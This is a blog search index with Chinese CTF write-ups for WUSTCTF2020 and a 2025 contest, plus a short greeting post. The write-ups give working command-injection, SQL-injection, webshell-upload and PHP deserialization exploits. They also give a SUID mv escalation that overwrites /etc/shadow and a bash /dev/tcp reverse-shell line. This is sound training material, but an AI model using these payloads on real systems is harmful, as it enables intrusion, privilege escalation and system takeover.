<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WUSCTF2020（部分解）</title>
      <link href="/2025/10/27/WUSCTF2020%EF%BC%88%E9%83%A8%E5%88%86%E8%A7%A3%EF%BC%89/"/>
      <url>/2025/10/27/WUSCTF2020%EF%BC%88%E9%83%A8%E5%88%86%E8%A7%A3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>&#x2F;robots下面有&#x2F;fAke_f1agggg.php一开始根据回显页面以为没用，但是响应头里面有东西！</p><p>&#x2F;fl4g.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就过滤了个空格和cat</p><p>md5那个地方一开始是自己去爆破用python，反正捣鼓了一段时间，其实应该先本地测的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;0e291242476940776845150308577824&quot;</span>==<span class="string">&quot;0e215962017&quot;</span></span><br></pre></td></tr></table></figure><p>php的弱比较，所以利用python写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> itertools.count(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> chars <span class="keyword">in</span> itertools.product(charset, repeat=length):</span><br><span class="line">        candidate = <span class="string">&#x27;0e&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line">        md5_hash = hashlib.md5(candidate.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0e&#x27;</span> == md5_hash[<span class="number">0</span>:<span class="number">2</span>:<span class="number">1</span>] <span class="keyword">and</span> md5_hash[<span class="number">2</span>::].isdigit():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到目标字符串：<span class="subst">&#123;candidate&#125;</span>     结果是:<span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;未找到长度为 <span class="subst">&#123;length&#125;</span> 的解，继续尝试更长字符串...&quot;</span>)</span><br></pre></td></tr></table></figure><p>好难跑，但还是跑出来了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1e4<span class="built_in">&amp;</span>md5=0e215962017<span class="built_in">&amp;</span>get<span class="built_in">_</span>flag=tac&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>考虑到是sql注入了，尝试：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;<span class="params">#</span>    不行，考虑数字类型</span><br><span class="line">1<span class="params">#</span>     可以，说明是数字类型</span><br><span class="line">1 or 1=1<span class="params">#</span>   student number not exists.贼奇怪，可能有过滤，只是没刻意提醒</span><br><span class="line">1/**/or/**/1=1<span class="params">#</span> 可以</span><br><span class="line">还有个大小写绕过</span><br><span class="line">-1/**/Union/**/sElect/**/1,2,3<span class="params">#</span></span><br><span class="line">-1/**/Union/**/sElect/**/1,2,(Select(group<span class="built_in">_</span>concat(value))from(flag))<span class="params">#</span></span><br></pre></td></tr></table></figure><p>也是一开始卡了，主要是过滤了没提醒！然后中间尝试了sqlmap的–temple参数，但是失败了，有工具还是好啊，但是工具一定要配合手测才更好！</p><p>现在发现思路很重要，不会的可以上网查，但是没思路就废了！所以我现在的想法就是注重思路的训练！</p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>有个注册页面，先注册登录再说，然后就只有一个头像上传的功能！</p><p>先上传一个仅改了后缀的一句话木马，然后发现有<code>exif_imagetype</code>有这个函数的检测，直接GIF89a绕过即可！</p><p>然后以为还要配合.user.ini没想到这题就是一个<code>exif_imagetype</code>后缀都没过滤！</p><p>然后访问上传地址直接getshell就行了！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星途ctf2025</title>
      <link href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/"/>
      <url>/2025/10/26/%E6%98%9F%E9%80%94ctf2025/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>突然感觉这个比赛考的东西挺好的，但是在打的时候太心急了！</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span>=<span class="variable language_">$this</span>-&gt;bro;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;qwe = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aer = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;asd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dfg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hjk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hjk = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dfg = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;say = <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;say;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fu =<span class="keyword">new</span> <span class="class"><span class="keyword">class</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ou = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;ou;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$hjkl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hjkl</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的链子挺简单的就不分析了，关键是如何去触发backdoor这个方法？</p><p><strong>分链子打法加&amp;引用</strong></p><p>所谓分链子就是链子一分为二呗，引用就是共享同一内存，这意味着，只要内存发生变化，&amp;引用也会发生变化</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Mason</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Ethan</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Grace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;say = <span class="variable">$c2</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;ou = [&amp;<span class="variable">$c2</span>-&gt;fu,<span class="string">&#x27;backdoor&#x27;</span>];     <span class="comment">//callable的形式去调用对象的方法</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><p>那么主要有两个疑问：</p><p>1.在触发<code>__toString</code>方法的时候为什么还要多创建一个<code>$c2 = new Chloe();</code>对象？</p><p>2.为什么在创建数组callable的时候第一个元素要加上&amp;？</p><p>对于第一个这就是我说的分链子，是为了让链子的结构更分明！那为什么要加&amp;呢？</p><p>这其实是一个<strong>先后顺序</strong>的问题！假设没有这个&amp;<code>$d-&gt;ou = [$c2-&gt;fu,&#39;backdoor&#39;];</code>你这个的第一个元素就是null，有&amp;这个那么就是第一个元素与<code>$c2-&gt;fu</code>共享同一内存地址，那么在序列化的时候就是&amp;null，但是在反序列化之后会触发<code>__toString</code>从而实现<code>$c2-&gt;fu</code>就是一个对象了！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：1，分链子 2，callable 3，引用内存共享</span><br></pre></td></tr></table></figure><h2 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h2><p><img src="/images/achieve/2025/10/1.png"></p><p>直接就有shell了！那会不会是没权限呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;fl*&quot;</span></span><br></pre></td></tr></table></figure><p>找了似乎没有，那只能考虑在当前用户没有权限的目录下了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwx------   1 root root 4096 Oct 21 06:33 root</span><br></pre></td></tr></table></figure><p>果然这个目录就只给了文件所有者权限</p><p>尝试suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mv</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><p>利用mv提权：构造恶意文件，然后mv移动污染&#x2F;etc&#x2F;shadow(这是存储用户密码的地方)</p><p>构造加盐加密的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt flag root</span><br><span class="line">openssl passwd：openssl 工具中用于生成密码哈希的子命令</span><br><span class="line">-1：指定使用 MD5 算法来生成哈希，这是 Linux 系统中常见且兼容的格式（通常以 $1$ 开头）</span><br><span class="line"><span class="comment">#$1$flag$Qiv1fGuuojJhoMNhwWehP.</span></span><br><span class="line">最终要写的：root:$1$flag<span class="variable">$Qiv1fGuuojJhoMNhwWehP</span>.:18000:0:99999:7:::</span><br></pre></td></tr></table></figure><p>写入文件（寻找可写目录）：</p><p><img src="/images/achieve/2025/10/1.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1;echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /home/ctfuser/txt</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;/usr/bin/mv /home/ctfuser/txt /etc/shadow</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/10/3.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：suid mv提权</span><br></pre></td></tr></table></figure><p>还有一题比赛时没看就懒得写了！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> suid提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/10/23/hello-world/"/>
      <url>/2025/10/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>感谢师傅们的文章！感谢师傅们的帮助！</p><p>我们在这个数字世界中相遇，本身就是一种奇妙的缘分。 </p><p><strong>新的旅程要开始了！</strong>期待与各位师傅们在道路上共同前行！😁😁😁</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
